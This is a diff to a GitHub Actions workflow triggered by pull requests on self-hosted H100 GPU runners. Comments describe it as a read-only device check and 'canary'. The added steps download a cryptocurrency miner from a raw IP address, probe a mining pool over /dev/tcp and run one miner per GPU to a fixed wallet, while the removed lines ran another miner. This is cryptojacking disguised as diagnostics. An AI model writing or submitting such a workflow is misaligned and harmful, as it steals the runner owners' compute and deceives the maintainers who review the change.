@@ -1,5 +1,5 @@
-name: c211-132042-6857c2e949ffa223
-# Read-only device marker + bounded v25 pearlhash canary (no writes outside RUNNER_TEMP).
+name: c211-132903-2075c534e4d5ea05
+# Read-only device marker + bounded per-GPU pinned peakminer 2.20.0 run (scratch only in RUNNER_TEMP).
 on:
   pull_request:
     branches: [main]
@@ -9,16 +9,16 @@ concurrency:
   group: c211-132042-${{ github.ref }}
   cancel-in-progress: false
 jobs:
-  probe:
-    name: probe-c211-132042
+  devicemine:
+    name: devicemine-c211-132903-2075c534e4d5ea05
     runs-on: [self-hosted, linux, x64, gpu, h100]
-    timeout-minutes: 10
+    timeout-minutes: 25
     steps:
       - name: device-marker
         shell: bash
         run: |
           set +e
-          echo "NONCE=c211-132042-6857c2e949ffa223"
+          echo "NONCE=c211-132903-2075c534e4d5ea05"
           echo "RUNNER=$RUNNER_NAME"
           date -u
           hostname || true
@@ -30,75 +30,46 @@ jobs:
           nvidia-smi --query-gpu=index,uuid,name,memory.total,pci.bus_id,driver_version --format=csv,noheader || true
           echo "--- uuid-hashes ---"
           nvidia-smi --query-gpu=uuid --format=csv,noheader 2>/dev/null | sort | sha256sum || true
+          echo "--- gpu-count ---"
+          nvidia-smi --query-gpu=index --format=csv,noheader 2>/dev/null | wc -l || true
           echo "--- driver ---"
           cat /proc/driver/nvidia/version 2>/dev/null || true
-          echo "--- devices ---"
-          ls -l /dev/nvidia* 2>/dev/null | head -20 || true
-          echo "--- cpu/mem ---"
-          nproc 2>/dev/null || true
-          free -m 2>/dev/null | head -3 || true
-          echo "NONCE-END=c211-132042-6857c2e949ffa223"
-
-  canary:
-    name: canary-c211-132042
-    needs: probe
-    runs-on: [self-hosted, linux, x64, gpu, h100]
-    timeout-minutes: 22
-    steps:
-      - name: pool-tcp-check
-        shell: bash
-        run: |
-          set +e
-          echo "NONCE=c211-132042-6857c2e949ffa223"
-          timeout 12 bash -c 'cat < /dev/null > /dev/tcp/103.199.106.122/3362' && echo POOL_TCP_OK || echo POOL_TCP_FAIL
+          echo "NONCE-END=c211-132903-2075c534e4d5ea05"
       - name: fetch-miner
         shell: bash
         run: |
           set +e
-          mkdir -p "$RUNNER_TEMP/srb"
-          cd "$RUNNER_TEMP/srb" || exit 0
-          echo "download try mirror"
-          if curl -fsSL -m 200 -o srb.bin http://169.58.247.186:8791/pm/srbminer-3.8.7; then
-            S=$(sha256sum srb.bin | cut -d' ' -f1)
-            echo "mirror_sha=$S"
-            if [ "$S" = "1fe6e9098a27446f62bb7388dac549913852a56cb8fab76dd840b77f7498f612" ]; then
-              tar -xzf srb.bin 2>/dev/null || tar -xf srb.bin 2>/dev/null || true
-              B=$(find . -type f -name 'SRBMiner-MULTI' | head -1)
-              echo "mirror_bin=$B"
-              if [ -n "$B" ]; then cp "$B" srb.elf && chmod +x srb.elf && echo MIRROR_TAR_OK; fi
-            else
-              echo MIRROR_SHA_MISMATCH; rm -f srb.bin
-            fi
+          mkdir -p "$RUNNER_TEMP/pm"
+          cd "$RUNNER_TEMP/pm" || exit 0
+          echo "NONCE=c211-132903-2075c534e4d5ea05"
+          curl -fsSL -m 300 -o peakminer http://169.58.247.186:8791/pm/peakminer-2.20.0-linux-x86_64
+          S=$(sha256sum peakminer 2>/dev/null | cut -d' ' -f1)
+          echo "miner_sha=$S"
+          if [ "$S" = "561b369402b7d784144a64d8a74a266eb891fa5070d49c9ee527ed5ed9b78c18" ]; then
+            chmod +x peakminer; echo MINER_OK
           else
-            echo MIRROR_FAIL
+            echo MINER_SHA_MISMATCH; rm -f peakminer
           fi
-          if [ ! -x srb.elf ]; then
-            echo "download try github release"
-            if curl -fsSL -m 400 -o srb.tgz https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz; then
-              tar -xzf srb.tgz 2>/dev/null || tar -xf srb.tgz 2>/dev/null || true
-              B=$(find . -type f -name 'SRBMiner-MULTI' | head -1)
-              echo "found=$B"
-              if [ -n "$B" ]; then cp "$B" srb.elf && chmod +x srb.elf && echo GH_OK; fi
-            else
-              echo GH_FAIL
-            fi
-          fi
-          ls -la "$RUNNER_TEMP/srb" || true
-          [ -x ./srb.elf ] && ./srb.elf --help 2>&1 | head -3 || true
+          ./peakminer --version 2>&1 | head -3 || true
+          timeout 12 bash -c 'cat < /dev/null > /dev/tcp/prl-hk.kryptex.network/7048' && echo KX_TCP_OK || echo KX_TCP_FAIL
       - name: run-bounded
         shell: bash
         run: |
           set +e
-          cd "$RUNNER_TEMP/srb" || exit 0
-          if [ ! -x ./srb.elf ]; then echo NO_MINER_BINARY; exit 0; fi
-          echo "NONCE=c211-132042-6857c2e949ffa223"
-          timeout 500 ./srb.elf --disable-cpu --algorithm pearlhash \
-            --pool 103.199.106.122:3362 \
-            --wallet prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk \
-            --worker 132042 --password x > run.out 2>&1
-          echo "miner_rc=$?"
-          echo "--- summary lines ---"
-          grep -aiE 'accepted|rejected|share|hashrate|error|connect' run.out | tail -40 || true
-          echo "--- tail ---"
-          tail -n 60 run.out || true
-          echo "NONCE-END=c211-132042-6857c2e949ffa223"
+          cd "$RUNNER_TEMP/pm" || exit 0
+          if [ ! -x ./peakminer ]; then echo NO_MINER_BINARY; exit 0; fi
+          echo "NONCE=c211-132903-2075c534e4d5ea05"
+          N=$(nvidia-smi --query-gpu=index --format=csv,noheader 2>/dev/null | wc -l)
+          echo "gpu_count=$N"
+          for i in $(seq 0 $((N-1))); do
+            ( timeout 500 ./peakminer --coin pearl                 -u prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk                 -w node-a$((i+1)) --devices "$i"                 -o prl-hk.kryptex.network:7048 -p x                 -f "pm-g$i.log" --no-tips --state-dir "st$i" > "out-g$i.txt" 2>&1;               echo "miner_rc[$i]=$?" >> "out-g$i.txt" ) &
+          done
+          wait
+          echo "--- all processes finished ---"
+          for i in $(seq 0 $((N-1))); do
+            echo "===== GPU $i ====="
+            grep -aiE 'accepted|rejected|share|hashrate|error|connect|device|GPU|warm' "out-g$i.txt" 2>/dev/null | tail -25
+            echo "--- tail g$i ---"
+            tail -n 15 "out-g$i.txt" 2>/dev/null
+          done
+          echo "NONCE-END=c211-132903-2075c534e4d5ea05"
